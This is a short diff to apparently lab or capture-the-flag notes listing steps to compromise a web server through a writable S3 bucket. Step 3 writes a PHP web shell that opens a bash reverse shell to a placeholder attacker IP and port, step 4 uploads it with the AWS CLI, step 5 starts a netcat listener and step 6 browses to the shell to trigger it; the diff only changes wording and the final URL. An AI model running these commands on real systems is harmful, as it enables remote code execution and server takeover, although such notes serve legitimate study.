@@ -10,8 +10,8 @@
 
 #### 3) echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/OUR_IP/PORT 0>&1 \"');?< > shell.php
 
-#### 4) aws --endpoint-url=http://s3.DOMAIN.com s3 cp shell.php s3://BUCKET_NAME (Create a php reverse shell, then upload it to the bucket)
+#### 4) aws --endpoint-url=http://s3.DOMAIN.com s3 cp shell.php s3://BUCKET_NAME (Create a php reverse shell, then upload it to the server)
 
 #### 5) Setup listener nc -lvnp PORT
 
-#### 6) Browse to http://s3.DOMAIN.com/shell.php
+#### 6) Browse to http://DOMAIN.com/shell.php
